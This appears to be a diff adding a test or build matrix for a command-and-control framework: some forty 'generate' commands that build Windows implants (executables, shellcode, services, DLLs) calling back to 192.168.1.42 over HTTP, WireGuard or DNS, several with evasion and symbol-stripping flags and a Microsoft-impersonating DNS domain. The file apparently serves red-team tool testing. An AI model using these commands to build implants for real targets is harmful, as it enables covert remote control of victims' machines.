@@ -1,0 +1,41 @@
+# HTTP
+
+generate --http 192.168.1.42 --os windows --arch 386 -f exe -s http__386.exe
+generate --http 192.168.1.42 --os windows --arch amd64 -f exe -s http__amd64.exe
+generate --http 192.168.1.42 --os windows --arch 386 -f shellcode -s http__386.shellcode
+generate --http 192.168.1.42 --os windows --arch 386 -f service -s http__386.service
+generate --http 192.168.1.42 --os windows --arch amd64 -f service -s http__amd64.service
+generate --http 192.168.1.42 --os windows --arch amd64 -f shared -s http__amd64.shared
+generate --http 192.168.1.42 -e --os windows --arch amd64 -f shellcode -s http__evasion_amd64.shellcode
+generate --http 192.168.1.42 -e --os windows --arch amd64 -f exe -s http__evasion_amd64.exe
+generate --http 192.168.1.42 -e --os windows --arch amd64 -f shared -s http__evasion_amd64.shared
+generate --http 192.168.1.42 -e --os windows --arch 386 -f shared -s http__evasion_386.shared
+generate --http 192.168.1.42 --skip-symbols --os windows --arch 386 -f exe -s http__skip_386.exe
+generate --http 192.168.1.42 --skip-symbols --os windows --arch amd64 -f exe -s http__skip_amd64.exe
+generate --http 192.168.1.42 --skip-symbols --os windows --arch amd64 -f shared -s http__skip_amd64.shared
+generate --http 192.168.1.42 --skip-symbols --os windows --arch amd64 -f shellcode -s http__skip_amd64.shellcode
+generate --http 192.168.1.42 --skip-symbols -e --os windows --arch 386 -f exe -s http__skip_evasion_386.exe
+generate --http 192.168.1.42 --skip-symbols -e --os windows --arch 386 -f shared -s http__skip_evasion_386.shared
+generate --http 192.168.1.42 --skip-symbols -e --os windows --arch amd64 -f service -s http__skip_evasion_amd64.service
+generate --http 192.168.1.42 --skip-symbols -e --os windows --arch amd64 -f shared -s http__skip_evasion_amd64.shared
+generate --wg 192.168.1.42 --http 192.168.1.42 --os windows --arch 386 -f exe -s wg_http__386.exe
+generate --wg 192.168.1.42 --http 192.168.1.42 --os windows --arch 386 -f service -s wg_http__386.service
+generate --wg 192.168.1.42 --http 192.168.1.42 --os windows --arch 386 -f shared -s wg_http__386.shared
+generate --wg 192.168.1.42 --http 192.168.1.42 --os windows --arch amd64 -f shellcode -s wg_http__amd64.shellcode
+generate --wg 192.168.1.42 --http 192.168.1.42 -e --os windows --arch 386 -f exe -s wg_http__evasion_386.exe
+generate --wg 192.168.1.42 --http 192.168.1.42 -e --os windows --arch 386 -f shared -s wg_http__evasion_386.shared
+generate --wg 192.168.1.42 --http 192.168.1.42 -e --os windows --arch amd64 -f shellcode -s wg_http__evasion_amd64.shellcode
+generate --wg 192.168.1.42 --http 192.168.1.42 --skip-symbols --os windows --arch 386 -f exe -s wg_http__skip_386.exe
+generate --wg 192.168.1.42 --http 192.168.1.42 --skip-symbols --os windows --arch amd64 -f shared -s wg_http__skip_amd64.shared
+generate --wg 192.168.1.42 --http 192.168.1.42 --skip-symbols --os windows --arch amd64 -f exe -s wg_http__skip_amd64.exe
+generate --wg 192.168.1.42 --http 192.168.1.42 --skip-symbols -e --os windows --arch 386 -f exe -s wg_http__skip_evasion_386.exe
+generate --wg 192.168.1.42 --http 192.168.1.42 --skip-symbols -e --os windows --arch 386 -f service -s wg_http__skip_evasion_386.service
+generate --wg 192.168.1.42 --http 192.168.1.42 --skip-symbols -e --os windows --arch amd64 -f shellcode -s wg_http__skip_evasion_amd64.shellcode
+generate --wg 192.168.1.42 --http 192.168.1.42 --dns blog.microsoft.com --os windows --arch 386 -f exe -s wg_http_dns__386.exe
+generate --wg 192.168.1.42 --http 192.168.1.42 --dns blog.microsoft.com --skip-symbols --os windows --arch 386 -f exe -s wg_http_dns__skip_386.exe
+generate --wg 192.168.1.42 --http 192.168.1.42 --dns blog.microsoft.com --skip-symbols --os windows --arch 386 -f shared -s wg_http_dns__skip_386.shared
+generate --wg 192.168.1.42 --http 192.168.1.42 --dns blog.microsoft.com --skip-symbols --os windows --arch amd64 -f service -s wg_http_dns__skip_amd64.service
+generate --wg 192.168.1.42 --http 192.168.1.42 --dns blog.microsoft.com --skip-symbols -e --os windows --arch 386 -f exe -s wg_http_dns__skip_evasion_386.exe
+generate --wg 192.168.1.42 --http 192.168.1.42 --dns blog.microsoft.com --skip-symbols -e --os windows --arch amd64 -f exe -s wg_http_dns__skip_evasion_amd64.exe
+generate --wg 192.168.1.42 --http 192.168.1.42 --dns blog.microsoft.com --skip-symbols -e --os windows --arch amd64 -f service -s wg_http_dns__skip_evasion_amd64.service
+generate --wg 192.168.1.42 --http 192.168.1.42 --dns blog.microsoft.com --skip-symbols -e --os windows --arch amd64 -f shared -s wg_http_dns__skip_evasion_amd64.shared
